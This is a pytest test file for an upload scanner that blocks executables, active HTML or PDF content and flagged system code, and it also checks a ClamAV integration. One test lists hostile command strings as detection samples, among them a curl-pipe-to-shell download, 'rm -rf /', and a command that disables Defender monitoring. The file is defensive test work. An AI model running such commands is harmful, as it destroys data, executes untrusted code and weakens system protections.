from types import SimpleNamespace

import pytest

from app.services import upload_scanner
from app.services.upload_scanner import BuiltinUploadScanner


@pytest.fixture
def scanner() -> BuiltinUploadScanner:
    return BuiltinUploadScanner()


@pytest.mark.parametrize(
    ("content", "detected_type"),
    [
        (b"MZ\x00\x00SYNTHETIC", "windows-pe"),
        (b"\x7fELFSYNTHETIC", "elf"),
        (b"\xcf\xfa\xed\xfeSYNTHETIC", "mach-o"),
    ],
)
def test_executable_signature_is_blocked_even_with_txt_extension(
    scanner, content, detected_type
):
    result = scanner.scan("renamed.txt", content)

    assert result.allowed is False
    assert result.rule_id == "executable-signature"
    assert result.detected_type == detected_type


def test_nul_byte_is_blocked_in_text(scanner):
    result = scanner.scan("notes.txt", b"safe\x00binary")

    assert result.allowed is False
    assert result.rule_id == "nul-byte-in-text"


@pytest.mark.parametrize(
    "text",
    [
        'powershell.exe -EncodedCommand SYNTHETIC',
        'os.system("rm -rf /")',
        'curl https://example.invalid/payload | sh',
        'Set-MpPreference -DisableRealtimeMonitoring $true',
    ],
)
def test_dangerous_system_code_is_blocked(scanner, text):
    result = scanner.scan("code.txt", text.encode())

    assert result.allowed is False
    assert result.detected_type == "dangerous-system-code"


@pytest.mark.parametrize(
    ("filename", "text"),
    [
        ("build.py", 'import subprocess\nsubprocess.run(["git", "status"])'),
        ("build.js", 'require("child_process").exec("npm test")'),
        ("deploy.ps1", 'Start-Process "notepad.exe"'),
        ("notes.txt", 'Example: subprocess.run(["tool", "--help"])'),
    ],
)
def test_benign_system_code_is_recognized_but_allowed(scanner, filename, text):
    result = scanner.scan(filename, text.encode())

    assert result.allowed is True
    assert result.detected_type == "system-code"


def test_benign_technical_prose_is_allowed(scanner):
    result = scanner.scan(
        "guide.md",
        b"This document explains process isolation without executable examples.",
    )

    assert result.allowed is True


def test_active_html_is_blocked(scanner):
    result = scanner.scan("page.html", b"<html><script>alert('test')</script></html>")

    assert result.allowed is False
    assert result.rule_id == "active-html-content"


def test_pdf_requires_pdf_signature(scanner):
    result = scanner.scan("document.pdf", b"not a pdf")

    assert result.allowed is False
    assert result.rule_id == "invalid-pdf-signature"


def test_active_pdf_marker_is_blocked(scanner):
    result = scanner.scan("document.pdf", b"%PDF-1.7\n1 0 obj << /S /JavaScript /JS 2 0 R >>")

    assert result.allowed is False
    assert result.rule_id == "active-pdf-content"


def test_pdf_open_action_without_script_is_allowed(scanner):
    result = scanner.scan(
        "cv.pdf", b"%PDF-1.7\n1 0 obj << /OpenAction 2 0 R /Type /Catalog >>"
    )

    assert result.allowed is True
    assert result.detected_type == "pdf"


def test_optional_clamav_reports_unavailable_but_keeps_benign_upload(monkeypatch):
    monkeypatch.setenv("UPLOAD_ANTIVIRUS_MODE", "optional")
    monkeypatch.setattr(upload_scanner.shutil, "which", lambda _command: None)

    result = upload_scanner.scan_upload("notes.txt", b"benign synthetic text")

    assert result.allowed is True
    assert result.checks[-1]["stage"] == "antivirus"
    assert result.checks[-1]["decision"] == "unavailable"


def test_required_clamav_fails_closed_when_engine_is_missing(monkeypatch):
    monkeypatch.setenv("UPLOAD_ANTIVIRUS_MODE", "required")
    monkeypatch.setattr(upload_scanner.shutil, "which", lambda _command: None)

    result = upload_scanner.scan_upload("notes.txt", b"benign synthetic text")

    assert result.allowed is False
    assert result.rule_id == "clamav-unavailable"


def test_clamav_signature_blocks_upload(monkeypatch):
    monkeypatch.setenv("UPLOAD_ANTIVIRUS_MODE", "required")
    monkeypatch.setattr(upload_scanner.shutil, "which", lambda _command: "clamscan")
    monkeypatch.setattr(
        upload_scanner.subprocess,
        "run",
        lambda *_args, **_kwargs: SimpleNamespace(returncode=1, stdout="FOUND", stderr=""),
    )

    result = upload_scanner.scan_upload("sample.txt", b"synthetic scanner fixture")

    assert result.allowed is False
    assert result.rule_id == "clamav-signature-detected"
    assert result.checks[-1]["engine"] == "clamav"


def test_clamav_uses_configured_signature_database(monkeypatch, tmp_path):
    captured = {}
    monkeypatch.setenv("UPLOAD_ANTIVIRUS_MODE", "required")
    monkeypatch.setenv("CLAMAV_DATABASE_PATH", str(tmp_path / "signatures"))
    monkeypatch.setattr(upload_scanner.shutil, "which", lambda _command: "clamscan")

    def fake_run(command, **_kwargs):
        captured["command"] = command
        return SimpleNamespace(returncode=0, stdout="", stderr="")

    monkeypatch.setattr(upload_scanner.subprocess, "run", fake_run)
    result = upload_scanner.scan_upload("sample.txt", b"synthetic scanner fixture")

    assert result.allowed is True
    assert f"--database={tmp_path / 'signatures'}" in captured["command"]
